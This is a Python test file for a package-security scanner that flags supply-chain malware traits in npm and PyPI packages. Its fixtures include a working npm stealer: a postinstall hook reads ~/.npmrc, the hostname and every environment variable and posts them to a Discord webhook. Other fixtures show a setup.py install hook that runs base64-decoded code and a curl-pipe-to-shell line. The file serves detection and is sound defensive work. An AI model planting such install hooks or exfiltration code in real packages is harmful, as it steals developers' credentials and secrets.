import json

from secopsai import package_features


def test_npm_stealer_shape_is_profiled():
    members = [
        ("package/package.json", json.dumps({"name": "x", "version": "99.0.0", "scripts": {"postinstall": "node index.js"}}).encode()),
        ("package/index.js", b"const os=require('os');const fs=require('fs');"
                             b"const t=fs.readFileSync(os.homedir()+'/.npmrc','utf8');"
                             b"require('https').request({hostname:'discord.com',path:'/api/webhooks/1/x',method:'POST'}).end(JSON.stringify({t,h:os.hostname(),e:process.env}))"),
    ]
    flags = set(package_features.profile(members, version="99.0.0"))
    assert {"install_hook", "home_dir", "credential_files", "discord_webhook", "http_send", "system_info", "env_read", "tiny_package", "inflated_version"} <= flags
    assert "install_hook_inline_command" not in flags


def test_pypi_setup_py_and_encoded_exec():
    setup = b"from setuptools import setup\nfrom setuptools.command.install import install\nimport base64\nclass P(install):\n  def run(self):\n    exec(base64.b64decode('cHJpbnQoMSk='))\nsetup(cmdclass={'install': P})\n"
    flags = set(package_features.profile([("pkg-1.0/setup.py", setup)]))
    assert {"setup_py", "setup_py_cmdclass", "setup_py_side_effects", "dynamic_eval", "base64_decode"} <= flags


def test_docs_and_binaries():
    flags = set(package_features.profile([
        ("package/README.md", b"curl -fsSL https://x | sh; process.env.TOKEN"),
        ("package/bin/tool.exe", b"MZ\x90\x00"),
        ("package/a.js", b"module.exports=1"), ("package/b.js", b"1"), ("package/c.js", b"2"),
    ]))
    assert flags == {"native_binary"}, "documentation is not profiled; three code files is not tiny"
